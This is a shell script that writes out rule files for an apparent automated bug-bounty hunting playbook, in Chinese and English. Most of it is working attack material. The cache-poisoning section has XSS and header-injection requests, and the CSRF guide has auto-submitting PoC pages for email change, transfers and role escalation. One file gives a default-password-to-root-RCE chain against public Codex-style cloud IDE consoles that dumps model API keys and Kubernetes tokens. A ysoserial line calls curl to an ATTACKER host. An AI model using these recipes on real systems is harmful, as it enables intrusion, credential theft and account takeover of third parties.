### 8.3 Poisoning via Response Header Injection

```http
### If unkeyed header is reflected in response headers:
GET / HTTP/1.1
X-Custom: value\r\nSet-Cookie: admin=true

### Response:
X-Custom: value
Set-Cookie: admin=true

### Cached → all users get the injected Set-Cookie
```

### 8.4 Web Cache Poisoning DoS

```http
### Poison response to return 403/500/redirect:
GET / HTTP/1.1
X-Forwarded-Host: thisdoesnotexist.com

### If origin tries to load resources from thisdoesnotexist.com:
### Response has broken resources → cached → DoS for all users
```

### 8.5 Chaining Cache Poisoning + XSS

```http
### Step 1: Find unkeyed header reflected in HTML
GET /page HTTP/1.1
X-Forwarded-Host: "><script>alert(document.cookie)</script>.com

### Step 2: Response (if reflected unsanitized):
<link rel="canonical" href="https://"><script>alert(document.cookie)</script>.com/page">

### Step 3: Cache stores this response
### Step 4: All users visiting /page execute attacker's JavaScript
```

---

## 9. TESTING CHECKLIST

```
□ Identify cache layer and CDN product
  - Check: X-Cache, cf-cache-status, Age, Via, X-Varnish, X-Served-By
□ Determine cache key composition
  - Test: adding query params, headers, cookies — does cache key change?
□ Discover unkeyed inputs
  - Headers: X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL, True-Client-IP
  - Parameters: utm_*, fbclid, gclid, callback, jsonp
  - Body: GET request with body parameters
□ Check reflection of unkeyed inputs
  - In HTML body, JavaScript, response headers, redirect Location
□ Verify caching of poisoned response
  - X-Cache: HIT on follow-up clean request
  - Response still contains poison → confirmed
□ Test parameter cloaking
  - Semicolon separator differences
  - Duplicate parameter handling
□ Check Vary header
  - Missing Vary: Cookie on personalized content?
  - Can influence Vary header value?
□ CDN-specific tests
  - ESI support?
  - Debug headers enabled?
  - Cache key reveal features?
□ Impact assessment
  - Stored XSS via cache poisoning?
  - Account takeover via session fixation?
  - DoS via broken resources?
```
TECH_CACHE_POISONING_TEST_EOF

seed_rule techniques/clickjacking-test.md <<'TECH_CLICKJACKING_TEST_EOF'
# clickjacking-test（缺头不写）

> 点击劫持缺安全头 **不交报告**。点到改绑 / 付钱 / 授权按那个写口写，不靠本篇教材。
TECH_CLICKJACKING_TEST_EOF

seed_rule techniques/cloud-ide-codex-rce-chain.md <<'TECH_CLOUD_IDE_CODEX_RCE_CHAIN_EOF'
# 云 IDE / Codex 系 AI 编程平台：弱口令→Root RCE→凭证链

> 类型：认证缺陷 + 危险 RPC + 容器/集群凭证链  
> 写不写只认 `vuln-report-format.md`。短表指针用标题搜。

---

## Codex 系编程台 RPC（短表有指针）

认：公网编程台有 `/tenant-api/login` + `/codex-api/rpc`（或同类租户登录 + Codex RPC）。不是对话口 bash 工具（那枪见 `agent-tool-exec-test.md`），也不是 VS Code 无登录墙读 environ（那枪见 `path-traversal-lfi-test.md`）。

打：当前站。裸默认口拿会话，再 `command/exec` / `fs/*` / `env`。无 Cookie 也试 `meta/methods`。认到只打当前站，禁止开新种子 FOFA。

算成：root 且 hostname 像持久计算面 Pod，并能读出集群 SA 或模型 Key。

假点：通配符证书临时实例随时销毁；只登录没有 RPC；模型只口头说执行了。半条链（只登录）继续挖 RPC，不进短表当打穿。

---

## 1. 模式画像（看到就测）

| 特征 | 示例 |
|------|------|
| 域名/产品 | AI 编程助手、playbook、Codex 系控制台（不钉某一家） |
| 路径 | `/tenant-api/login`、`/codex-api/rpc`、`/tenant-api/*` |
| 框架痕迹 | OpenAI Codex、`@openai/codex`、thread/model RPC |
| 环境 | dev / pre / fat / gray / sandbox（**公网暴露的 DEV 优先扫**，再找生产同构） |
| 默认账密 | 这形态控制台的裸默认口（`admin/admin` 一类），**不是**每站登录框字典 |

**一句话链路：**

```
弱口令/未授权登录 → 租户会话(JWT/Cookie)
  → POST /codex-api/rpc method=command/exec（root）
  → env / fs 读集群 SA + 模型 API Key + 邀请码
  → 额度消耗 / 潜在横向 / 持久化
```

---

## 2. 最小探测矩阵（每个候选 Host）

### 2.1 指纹

```bash
# 登录面
curl -sk -o /dev/null -w "%{http_code}" -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" -d '{"username":"x","password":"y"}'

# RPC 面（无 Cookie 时也要看错误形态：401 vs method not found vs 直通）
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -d '{"method":"meta/methods","params":{}}'
```

存活信号：
- 登录返回 JSON（userId / session / 密码错误）而非整站 405 HTML
- RPC 返回 JSON-RPC 形态 / methods 列表 / 未登录明确错误
- 前端标题含 codex / playbook / 编程台

### 2.2 弱口令（登录）

只打**当前站**这形态控制台的裸默认口（`rules/srcskill/dig-scope-workflow.md` §4.1.1：登录表单字典不当必做）。一眼：

```bash
curl -sk -X POST "https://HOST/tenant-api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}' -D -
```

常见：`admin/admin`、`admin/123456`；有 `TENANT_ADMIN_USERNAMES` / 邀请码再当钥匙。没有入口或证伪就停，不磨验证码。

成功：`Set-Cookie: tenant_session=...` 或 body 含 `userId` + 身份 admin。

### 2.3 RCE / 文件 / 元方法（登录后）

```bash
# 方法枚举
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"meta/methods","params":{}}'

# 命令执行（最小证明：id / whoami / hostname）
curl -sk -X POST "https://HOST/codex-api/rpc" \
  -H "Content-Type: application/json" \
  -b "tenant_session=SESSION" \
  -d '{"method":"command/exec","params":{"command":["id"]}}'

# 目录 / 读文件
-d '{"method":"fs/readDirectory","params":{"path":"/"}}'
-d '{"method":"fs/readFile","params":{"path":"/etc/os-release"}}'

# 环境变量（密钥）
-d '{"method":"command/exec","params":{"command":["env"]}}'

# 集群 SA（若容器在集群内）
-d '{"method":"command/exec","params":{"command":["cat","/var/run/secrets/kubernetes.io/serviceaccount/token"]}}'
```

**危险方法清单（命中即高价值）：**

| method | 含义 |
|--------|------|
| `command/exec` | 任意命令 |
| `fs/readFile` / `fs/writeFile` / `fs/remove` / `fs/readDirectory` | 文件系统 |
| `meta/methods` | 能力面枚举 |
| `thread/start` / `model/list` | AI 会话与模型（耗 Key） |
| git 相关 RPC | 代码仓读写 |

---

## 3. 危害证明怎么写才硬（SRC）

优先证据顺序：

1. **Root RCE**：`id` → `uid=0(root)`（最小、可复核）
2. **环境与持久服务**：hostname 像计算面 Pod 名 ≠ 随机临时沙箱文案
3. **密钥**：模型 `*_API_KEY`（报告可打码中间段）
4. **集群**：`KUBERNETES_SERVICE_HOST` + SA token 可读
5. **邀请码 / 管理员用户名**：可注册持久账号
6. **RPC 面宽度**：80+ methods 截一段危险列表即可

**边界写清：**
- 是否公网未授权 / 仅弱口令
- 是否 root、是否集群内
- Key 是否可用于外部模型额度消耗
- DEV vs 生产：若只有 DEV，正文标明环境；能找到 **prod 同构** 一并打更稳

**假点再钉一次：** 通配符证书临时实例随时销毁 → 不算打穿。持久计算面 + 凭证链才往下写。半条（只登录无 RPC）继续挖，不按打穿进表。

---

## 4. 资产怎么找

**只打当前站。** 认到 `/tenant-api/login`、`/codex-api/rpc` 就在本 host 打 §2，禁止认到就新开种子、FOFA 全网同皮（hunt-iter 开场；`rules/srcskill/dig-scope-workflow.md` 一种子闭环）。优质根域只回灌，本种子剩余活面挖完才搜。

下面语句**仅当本任务本种子已经是 Codex / 编程台这条**时，用来翻本种子结果，不是认到同框架就另开工厂：

```
body="/codex-api/rpc" || body="/tenant-api/login"
body="codex-api" && body="tenant"
body="@openai/codex" || body="command/exec"
```

当前站 JS 里的 `tenant-api`、`codex-api`、RPC method、邀请码，跟本站清单，不拿去开新种子。

---

## 5. 同构变体（不要只会 admin/admin）

1. **零认证 RPC**：无 Cookie 直接 `command/exec` / `meta/methods`
2. **注册接口 + 固定邀请码**：env 或前端硬编码 `TENANT_INVITE_CODE`
3. **JWT 弱密钥 / 算法 none**：`tenant_session` 伪造 admin
4. **WebSocket / 另一网关**：同源 Codex 走 WS 推命令
5. **同种子 sibling**：去 `-dev` / 生产 host 只做一眼差分（新 path / 回码变了才升级）。禁止为此开新种子 FOFA
6. **多租户隔离**：普通用户 session 是否也能 `command/exec`（垂直越权 RCE）

---

## 6. 操作纪律

- 命令执行只做 **id / hostname / 只读 cat 指定路径**；禁止破坏性写、挖矿、扫内网爆破
- 密钥写入报告时注意脱敏策略（平台要求完整则贴完整，否则中间打码 + 说明长度）
- 别停在能传能下；本链价值在 **RCE + 密钥 + 集群**
- 半条链（只登录无 RCE）继续挖 RPC

---

## 7. 对照骨架（无实站）

| 项 | 值 |
|----|-----|
| 登录 | `POST /tenant-api/login` 裸默认口 → `tenant_session` |
| RCE | `POST /codex-api/rpc` `command/exec` → root |
| 环境 | 计算面 Pod；集群 API 内网 |
| 链上资产 | 模型 Key、SA token、邀请码、宽 RPC |
| 写不写 | 只认 `vuln-report-format.md`。DEV 是否收录看 SRC 口径；有 prod 同构更稳 |

复现骨架（HOST / SESSION 换成当前站实值）：

```http
POST /tenant-api/login HTTP/1.1
Host: HOST
Content-Type: application/json

{"username":"admin","password":"admin"}
```

```http
POST /codex-api/rpc HTTP/1.1
Host: HOST
Content-Type: application/json
Cookie: tenant_session=SESSION

{"method":"command/exec","params":{"command":["id"]}}
```

---

## 8. 一句话

**公网 Codex 系编程台：当前站先打 `/tenant-api/login` 裸默认口与注册码，再打 `/codex-api/rpc` 的 `command/exec`+`fs/*`+`env`，用 root+集群+API Key 闭环。认到只打当前站，优先持久化生产面。**
TECH_CLOUD_IDE_CODEX_RCE_CHAIN_EOF

seed_rule techniques/cors-test.md <<'TECH_CORS_TEST_EOF'
# cors（仅技术资料 · SRC 禁用）

> **永久强制：** SRC 黑盒 CORS **不挖、不测、勿开本篇**（`cors-vuln-report-priority.md`）。看到 ACAO/ACAC → 立刻转注入 / SSRF / XSS / RCE / 越权 / 未授权业务读。写不写只认 `vuln-report-format.md`。
TECH_CORS_TEST_EOF

seed_rule techniques/crlf-injection-test.md <<'TECH_CRLF_INJECTION_TEST_EOF'
# crlf-injection-test（几乎不交）

> 纯 CRLF 头注入默认不写。Host 毒重置走 `http-host-header-test.md`。Ghost Bits 邮件/走私用公式 `chr((k<<8)|T)`，见 `ghost-bits-cast-test.md`。
TECH_CRLF_INJECTION_TEST_EOF

seed_rule techniques/csp-bypass-test.md <<'TECH_CSP_BYPASS_TEST_EOF'
# csp-bypass-test（几乎不交）

> 单独绕 CSP 不交。XSS 打穿走 `xss-test.md`（含 JSONP/CDN/base-uri 开场）。
TECH_CSP_BYPASS_TEST_EOF

seed_rule techniques/csrf-test.md <<'TECH_CSRF_TEST_EOF'
# csrf

> **SRC 纪律：** 本文测 **CSRF 写成功** 等仍可作中高（有跨用户/敏感写才报）。  
> 文中出现的 CORS 仅作链路基座理解；**禁止**把 CORS 单独写成主洞报告（`cors-vuln-report-priority`：不挖不写）。

# CSRF — Cross-Site Request Forgery


## 1. CORE CONCEPT

CSRF exploits a victim's active session to perform state-changing requests **from the attacker's origin**.

**Required conditions**:
1. Victim is authenticated (active session cookie)
2. Server identifies session via cookie only (no secondary check)
3. Attacker can predict/construct the valid request
4. Cookie is sent cross-origin (SameSite=None or legacy behavior)

---

## 2. FINDING CSRF TARGETS

**High-value state-changing endpoints**:
```
- Password change         ← account takeover
- Email change            ← account takeover
- Add admin / change role ← privilege escalation
- Bank/payment transfer   ← financial impact
- OAuth app authorization ← hijack oauth flow
- Account deletion
- Two-factor auth disable  
- SSH key / API key addition
- Webhook configuration
- Profile/contact info update
```

---

## 3. TOKEN BYPASS TECHNIQUES

### No Token Present
Simplest case — form simply lacks CSRF token. Check if POST /change-email has any token. If not → trivially exploitable.

### Token Not Validated (most common finding!)
Token exists in request but is never verified server-side:
```
Remove the _csrf_token parameter entirely → does request still succeed?
→ YES → trivial bypass
```

### Token Tied to Session but Not to User
```
Step 1: Log in as UserA → obtain valid CSRF token
Step 2: Log in as UserB in other browser → obtain UserB CSRF token  
Step 3: Use UserB's CSRF token in UserA's session (attacker controls UserB)
→ If server validates token exists but doesn't check if it belongs to the session → bypass
```

### Token in Cookie Only
When server sets CSRF token as cookie and expects it back in a header/form:
```
Set-Cookie: csrf=ATTACKER_CONTROLLED
→ If cookie can be set by subdomain (cookie tossing): set cookie to known value
→ Submit form with known token in header + known token in cookie = bypass
```

### Static or Predictable Token
```
→ Same token across all users/sessions
→ Token = base64(username) or md5(session_id) → reversible
→ Token = timestamp → predictable
```

### Double Submit Cookie Pattern (broken if subdomain trusted)
```
If attacker can write cookies for .target.com from subdomain XSS or cookie tossing:
→ Set csrf_cookie=CONTROLLED on .target.com
→ Submit request with X-CSRF-Token: CONTROLLED
→ Server checks header == cookie → match → bypass
```

---

## 4. SAMESITE BYPASS SCENARIOS

**SameSite=Lax** (modern browser default): cookies sent for top-level GET navigation, NOT for cross-site iframe/form POST.

**Bypass SameSite=Lax via GET method**:
```html
<!-- If server accepts GET for state-changing endpoint: -->
<img src="https://target.com/account/delete?confirm=yes">
<script>document.location = 'https://target.com/transfer?to=attacker&amount=1000';</script>
```

**Bypass via subdomain XSS (SameSite Lax/Strict)**:
```javascript
// XSS on sub.target.com → same-site origin → SameSite cookies sent!
// Use XSS as staging point for CSRF
window.location = 'https://target.com/account/modify?evil=true';
```

**SameSite=None** (legacy or explicit): cookies sent everywhere → classic CSRF applies.

**Cookie issued recently? Lax exemption:**
Chrome has a 2-minute exception where Lax cookies ARE sent on cross-site POSTs if the cookie was just set (for OAuth flows). Race window: set cookie, immediately trigger CSRF within 2 minutes.

---

## 5. CSRF PROOF OF CONCEPT TEMPLATES

### Simple Form POST
```html
<html>
<body>
<form id="csrf" action="https://target.com/account/email/change" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com">
  <input type="hidden" name="confirm_email" value="attacker@evil.com">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

### Auto-click Submit
```html
<body onload="document.forms[0].submit()">
<form action="https://target.com/transfer" method="POST">
  <input name="to" value="attacker_account">
  <input name="amount" value="10000">
</form>
</body>
```

### CSRF via GET (with img tag)
```html
<img src="https://target.com/api/v1/admin/delete-user?id=12345" style="display:none">
```

### CSRF with Custom Header (XMLHttpRequest — same-origin only, defeats naive defenses)
If API requires custom header like `X-CSRF-Token` but also accepts JSON with wildcard CORS — custom headers don't protect if CORS misconfigured:
```javascript
// If Access-Control-Allow-Origin: * with credentials → broken
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/transfer");
xhr.setRequestHeader("Content-Type", "application/json");
xhr.withCredentials = true;  // still need cookie sending
xhr.send('{"to":"attacker","amount":1000}');
```

---

## 6. JSON CSRF

When endpoint accepts `Content-Type: application/json` — fetch() with CORS credentials:

```javascript
// If CORS allows credentials + the endpoint:
fetch('https://target.com/api/v1/change-email', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
});
```
**Requires**: `Access-Control-Allow-Origin: https://attacker.com` AND `Access-Control-Allow-Credentials: true`

**If server only accepts `application/json` but no fetch CORS:**
Can't do proper JSON CSRF from HTML form (forms can only send `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`).

**Trick — Content-Type Downgrade**: If server processes `text/plain` body as JSON:
```html
<form enctype="text/plain" method="POST" action="https://target.com/api">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```
Resulting body: `{"email":"attacker@evil.com","ignore":"="}`

---

## 7. MULTIPART CSRF

When changing `Content-Type` from `application/json` to `multipart/form-data` and request still works:
```html
<form method="POST" action="https://target.com/api/update" enctype="multipart/form-data">
  <input name="email" value="attacker@evil.com">
</form>
```

---

## 8. CSRF + XSS COMBINATION (CSRF Token Bypass)

When CSRF protection is otherwise solid, XSS enables CSRF bypass:
```javascript
// Step 1: XSS reads CSRF token from DOM
var token = document.querySelector('input[name="csrf_token"]').value;
// Step 2: Submit CSRF request with real token
var xhr = new XMLHttpRequest();
xhr.open('POST', '/account/delete', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes&csrf_token=' + token);
```

---

## 9. OAUTH CSRF (STATE PARAMETER MISSING)

OAuth flow without `state` parameter → CSRF on the OAuth authorization:

**Attack**:
1. Attacker initiates OAuth flow, gets authorization code
2. Before exchanging code, stops the flow (captures the redirect URL with code)
3. Sends victim the crafted URL: `https://target.com/oauth/callback?code=ATTACKER_CODE`
4. Victim's browser exchanges the attacker's code → victim's account linked to attacker's OAuth provider

**Impact**: Attacker can log in as victim.

---

## 10. CSRF TESTING CHECKLIST

```
□ Remove CSRF token entirely → does request succeed?
□ Change CSRF token to random value → does request succeed?
□ Use CSRF token from another user's session → does request succeed?
□ Check if GET version of POST endpoint exists
□ Check SameSite attribute of session cookie
□ Test if Content-Type change (json → form → text/plain) still processes
□ JSON CSRF：以「写操作是否跨站成功」为证；勿单独交 CORS 报告（SRC 不挖不写 CORS）
□ Check OAuth flows for missing state parameter
□ QR / 扫码登录：token 能否进 URL、已登录点开是否等于确认（§18）
□ Test referrer-based protection: send request with no Referer header
□ Test referrer-based protection: spoof subdomain in referer
```

---

## 11. JSON CSRF TECHNIQUES

### Method 1: text/plain Disguise

```html
<!-- Browser sends Content-Type: text/plain with JSON-like body -->
<form action="https://target.com/api/role" method="POST" enctype="text/plain">
  <input name='{"role":"admin","ignore":"' value='"}' type="hidden">
  <input type="submit" value="Click me">
</form>
<!-- Resulting body: {"role":"admin","ignore":"="} -->
<!-- Server may parse as JSON if it doesn't strictly check Content-Type -->
```

### Method 2: XHR with Credentials

```html
<script>
var xhr = new XMLHttpRequest();
xhr.open("POST", "https://target.com/api/role", true);
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/json");
xhr.send('{"role":"admin"}');
</script>
<!-- Only works if CORS allows the origin (misconfigured CORS + CSRF combo) -->
```

### Method 3: fetch() API

```html
<script>
fetch("https://target.com/api/role", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"role":"admin"}'
});
</script>
```

---

## 12. MULTIPART CSRF & CLIENT-SIDE PATH TRAVERSAL

### Multipart File Upload CSRF

```html
<script>
var formData = new FormData();
formData.append("file", new Blob(["malicious content"], {type: "text/plain"}), "shell.php");
formData.append("action", "upload");

fetch("https://target.com/upload", {
  method: "POST",
  credentials: "include",
  body: formData
});
</script>
```

### Client-Side Path Traversal to CSRF (CSPT2CSRF)

```
Normal flow: Frontend fetches /api/user/PROFILE_ID/settings
Attack: Set PROFILE_ID to ../../admin/dangerous-action

Result: Frontend's fetch() hits /api/admin/dangerous-action with victim's cookies
This converts a path traversal into a CSRF-like attack without needing a CSRF token
```

| Aspect | Traditional CSRF | CSPT2CSRF |
|---|---|---|
| Origin | Attacker's site | Same-origin JavaScript |
| Token bypass | Needs token forgery | No token needed (same-origin) |
| SameSite | Blocked by SameSite=Strict | Bypasses SameSite (same site!) |
| Detection | Standard CSRF checks | Requires input validation on path segments |

---

## 13. SAMESITE=LAX ADVANCED BYPASS TECHNIQUES

### 13.1 Top-level navigation via `window.open()` (2-minute window)

Chrome's Lax+POST exception: cookies with `SameSite=Lax` are sent on cross-site POST requests if the cookie was set within the last 2 minutes (exists for OAuth flows).

```javascript
// Attacker page: trigger login to set a fresh cookie, then immediately CSRF
// Step 1: Force victim to visit target (sets fresh session cookie)
window.open('https://target.com/login');
// Step 2: Within 2 minutes, POST to state-changing endpoint
setTimeout(() => {
    const form = document.createElement('form');
    form.method = 'POST';
    form.action = 'https://target.com/account/change-email';
    form.innerHTML = '<input name="email" value="attacker@evil.com">';
    document.body.appendChild(form);
    form.submit();
}, 5000);
```

### 13.2 302 redirect chain from attacker site

Lax cookies are sent on top-level GET navigations. A redirect chain converts GET into action:

```text
1. Attacker page → 302 redirect to https://target.com/transfer?to=attacker&amount=1000
2. Browser follows redirect as top-level navigation → Lax cookies sent
3. If target accepts GET for state-changing operations → CSRF succeeds
```

### 13.3 Method override: POST disguised as GET

Many frameworks support method override via `_method` parameter:

```text
GET /account/delete?_method=DELETE&confirm=yes HTTP/1.1
GET /transfer?_method=POST&to=attacker&amount=1000 HTTP/1.1
```

Headers that trigger method override:
```text
X-HTTP-Method-Override: POST
X-Method-Override: DELETE
_method=PUT (Rails, Laravel, Symfony)
```

SameSite=Lax allows the GET → framework processes it as POST/DELETE via override → CSRF on "POST-only" endpoints.

---

## 14. ADVANCED JSON CSRF TECHNIQUES

### 14.1 Flash-based Content-Type manipulation (legacy)

Flash (pre-2021) could send arbitrary `Content-Type` headers cross-origin without preflight:

```actionscript
var req:URLRequest = new URLRequest("https://target.com/api/role");
req.method = "POST";
req.contentType = "application/json";
req.data = '{"role":"admin"}';
navigateToURL(req);
```

Legacy but still relevant for older internal applications.

### 14.2 fetch() no-cors mode limitations and workarounds

`fetch()` in `no-cors` mode can send simple requests but cannot set `Content-Type: application/json` (triggers preflight) or read the response.

Workaround — if the server accepts `text/plain` body and parses it as JSON:

```javascript
fetch('https://target.com/api/role', {
    method: 'POST',
    mode: 'no-cors',
    credentials: 'include',
    headers: {'Content-Type': 'text/plain'},
    body: '{"role":"admin"}'
});
```

### 14.3 Encoding JSON as form-urlencoded

Some backends accept both content types:

```html
<form action="https://target.com/api/role" method="POST">
  <input name="role" value="admin">
  <input name="user_id" value="123">
</form>
```

If the server processes `role=admin&user_id=123` the same as `{"role":"admin","user_id":123}` → CSRF via plain HTML form without CORS preflight.

---

## 15. CSRF + CORS MISCONFIGURATION CHAINS

> **SRC：** 本节只帮助理解「读 token → 再 CSRF 写」。  
> 主洞写 **CSRF / 越权写**；**不要**另交 CORS 报告。

### Reflected Origin + Credentials

```text
1. Target API reflects Origin in Access-Control-Allow-Origin
2. Access-Control-Allow-Credentials: true
3. Attacker page sends credentialed fetch() from https://evil.com
4. Response is readable → CSRF token extracted from response
5. Second request with valid CSRF token → bypass all CSRF defenses
```

```javascript
fetch('https://target.com/api/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(data => {
      fetch('https://target.com/api/change-email', {
          method: 'POST',
          credentials: 'include',
          headers: {
              'Content-Type': 'application/json',
              'X-CSRF-Token': data.csrf_token
          },
          body: JSON.stringify({email: 'attacker@evil.com'})
      });
  });
```

### Subdomain XSS → CORS → CSRF

If `*.target.com` is in the CORS allowlist and an XSS exists on any subdomain:
1. Exploit XSS on `blog.target.com`
2. From XSS context, fetch API at `api.target.com` (CORS allows subdomain)
3. Read CSRF token from response
4. Submit state-changing request with valid token

---

## 16. CSRF TOKEN FIXATION (PRE-SESSION TOKENS)

If CSRF tokens are issued before authentication and remain valid after login:

```text
1. Attacker visits target.com → receives CSRF token T1
2. Attacker forces victim's browser to use T1:
   a. Cookie tossing from subdomain
   b. CRLF injection to set csrf_cookie
3. Victim logs in — CSRF token unchanged
4. Attacker submits CSRF request with known T1 → succeeds
```

### Test procedure

```text
□ Obtain CSRF token as unauthenticated user
□ Log in — does the CSRF token change?
□ If unchanged → token fixation: pre-auth token works post-auth
□ Use pre-auth token in a CSRF PoC against authenticated endpoint
```

---

## 17. CLICKJACKING AS CSRF BYPASS

When CSRF protections are solid but `X-Frame-Options` / `frame-ancestors` is missing:

### Attack flow

```text
1. Target page is frameable (no X-Frame-Options / CSP frame-ancestors)
2. Attacker creates transparent iframe overlay
3. Victim sees attacker content, clicks land on target's action button in hidden iframe
4. Click originates from same origin (within iframe) — bypasses CSRF tokens
```

### PoC template

```html
<html>
<body>
<div style="position:relative">
  <iframe src="https://target.com/account/settings"
    style="opacity:0.0001; position:absolute; top:0; left:0;
           width:500px; height:500px; z-index:2;">
  </iframe>
  <button style="position:absolute; top:250px; left:200px; z-index:1;
                 padding:20px; font-size:24px;">
    Click to claim prize!
  </button>
</div>
</body>
</html>
```

### Defense check

```text
□ X-Frame-Options: DENY or SAMEORIGIN header present?
□ CSP: frame-ancestors 'self' or frame-ancestors 'none'?
□ If neither → clickjacking possible → CSRF bypass via iframe
```

---

## 18. 扫码登录 CSRF → 用户接管（短表有指针）

> 本质：已登录用户被骗打开一条 URL，Cookie 自己带过去，等于帮攻击者点了「确认扫码」。  
> 和改密/转账 CSRF 同类，打在「确认扫码」这一下。短表一行指向本节。  
> 进库的是手法，不是某个站的 token 实值。

### 18.1 认什么（开场就能认）

同时出现就当开场几枪：

- 登录页有二维码 / 「用 App 扫码」
- 不登录调生成接口，回包里有 `token`（或 ticket / scene / sid），常带过期时间
- 同一站还有登录 URL 吃 query：`/login?token=`、`?ticket=`、`agentType=` 之类

### 18.2 链怎么穿（两边浏览器）

```
攻击者（无痕、未登录）
  → 打开扫码登录
  → 抓住生成 token 的请求/响应（常见 path 含 qrcode / qr / gen_login_token / is_token_login）
  → 把 token 塞进登录页 URL

受害者（已登录同一站点）
  → 打开这条 URL（顶栏跳转即可，和 SameSite=Lax 顶栏 GET 对得上）
  → 服务端把该 token 绑到他的号上（等于扫码确认）

攻击者无痕
  → 轮询/刷新后变成受害者的号
```

构造形态（字段名按现场改，不要死抄）：

```
https://目标登录页?token=刚才拿到的token
https://目标登录页?agentType=数字&token=...&lang=...
```

### 18.3 出什么算成

攻击者**未登录**的那一端出现对方头像/账号，能当对方用。  
只证明「已登录的人打开了链接」不算；必须无痕那边登录态过来。

### 18.4 假点（形态不是洞，不是「这站没打穿」）

- token 过期后再点，两边都没登录
- 点开只重新出一张码，不把 token 绑到当前已登录号
- 必须手机 App 真扫，URL 打开不算确认

这站 401 / token 换了一串没中 → 只说明这站不行，**下一站同类照样打**，不删短表这行。

### 18.5 和邻近手法别混

| 本条 | 别当成 |
|------|--------|
| 确认扫码这一下的 CSRF | 不登录直接读业务接口 |
| 受害者要已登录（要会话） | 无密码登录绕过、空密进后台 |
| GET 登录 URL 就能确认 | 必须 POST + 自定义头才改状态的 CSRF（那种还要另测） |

OAuth 缺 `state` 把 code 丢给受害者（§9）是近亲：都是「已登录的人打开攻击者准备好的回调」。扫码这条认的是 **QR token**，不是 authorization code。

### 18.6 开场探针（有入口就打，半分钟级）

1. 不登录打开扫码登录，抓生成 token 的接口  
2. 看响应有没有 token / 过期字段；看前端会不会拼 `/login?token=`  
3. 自己已登录的另一个配置打开拼好的 URL  
4. 回未登录端看是否变成自己的号  

第 4 步成立 → 按 `src-value` 写接管报告。密钥/token 实值只写报告，不写进短表。

### 18.7 社交 App 内置浏览器（见了再打）

页是在社交 App WebView 里打开、且会按域自动带 `pskey` / 静默 OAuth 时：同域 XSS 可以顺手把凭证带出去，或替已登录用户点确认扫码。**不是每站必打**；没有这层壳，仍只打上面的扫码 CSRF。不进短表。
TECH_CSRF_TEST_EOF

seed_rule techniques/csv-formula-injection-test.md <<'TECH_CSV_FORMULA_INJECTION_TEST_EOF'
# csv-formula-injection-test（几乎不交）

> CSV 公式注入没打到他人数据/能执行默认不写。导出越权走 `idor-test.md`。
TECH_CSV_FORMULA_INJECTION_TEST_EOF

seed_rule techniques/dangling-markup-test.md <<'TECH_DANGLING_MARKUP_TEST_EOF'
# dangling-markup-test（几乎不交）

> 悬空标记抽 CSRF/token 半条链默认不写。现场 XSS 回显仍走 `xss-test.md`。
TECH_DANGLING_MARKUP_TEST_EOF

seed_rule techniques/dependency-confusion-test.md <<'TECH_DEPENDENCY_CONFUSION_TEST_EOF'
# dependency-confusion-test（几乎不交）

> 依赖混淆默认不写。供应链/内部包名现场认到再打，不靠本篇教材。
TECH_DEPENDENCY_CONFUSION_TEST_EOF

seed_rule techniques/deserialization-test.md <<'TECH_DESERIALIZATION_TEST_EOF'
# deserialization

# Insecure Deserialization


## 1. TRAFFIC FINGERPRINTING — IS IT DESERIALIZATION?

### Java Serialized Objects

| Indicator | Where to Look |
|---|---|
| Hex `ac ed 00 05` | Raw binary in request/response body, cookies, POST params |
| Base64 `rO0AB` | Cookies (`rememberMe`), hidden form fields, JWT claims |
| `Content-Type: application/x-java-serialized-object` | HTTP headers |
| T3/IIOP protocol traffic | WebLogic ports (7001, 7002) |

### PHP Serialized Objects

| Indicator | Where to Look |
|---|---|
| `O:NUMBER:"ClassName"` pattern | POST body, cookies, session files |
| `a:NUMBER:{` (array) | Same locations |
| `phar://` URI usage | File operations accepting user-controlled paths |

### Python Pickle

| Indicator | Where to Look |
|---|---|
| Hex `80 03` or `80 04` (protocol 3/4) | Binary data in requests, message queues |
| Base64-encoded binary blob | API params, cookies, Redis values |
| `pickle.loads` / `pickle.load` in source | Code review / whitebox |

---

## 2. JAVA — GADGET CHAINS AND TOOLS

### ysoserial — Primary Tool

```bash
# Generate payload (example: CommonsCollections1 chain with command)
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" > payload.bin

# Base64-encode for HTTP transport
java -jar ysoserial.jar CommonsCollections1 "id" | base64 -w0

# Common chains to try (ordered by frequency of vulnerable dependency):
# CommonsCollections1-7  — Apache Commons Collections 3.x / 4.x
# Spring1, Spring2       — Spring Framework
# Groovy1               — Groovy
# Hibernate1            — Hibernate
# JBossInterceptors1    — JBoss
# Jdk7u21               — JDK 7u21 (no extra dependency)
# URLDNS                — DNS-only confirmation (no RCE, works everywhere)
```

### URLDNS — Safe Confirmation Probe

URLDNS triggers a DNS lookup without RCE — safe for confirming deserialization without damage:

```bash
java -jar ysoserial.jar URLDNS "http://UNIQUE_TOKEN.burpcollaborator.net" > probe.bin
```

DNS hit on collaborator = confirmed deserialization. Then escalate to RCE chains.

### Commons Collections — The Classic Chain

The vulnerability exists when `org.apache.commons.collections` (3.x) is on the classpath and the application calls `readObject()` on untrusted data.

Key classes in the chain: `InvokerTransformer` → `ChainedTransformer` → `TransformedMap` → triggers `Runtime.exec()` during deserialization.

### Apache Shiro — rememberMe Deserialization

Shiro uses AES-CBC to encrypt serialized Java objects in the `rememberMe` cookie.

```text
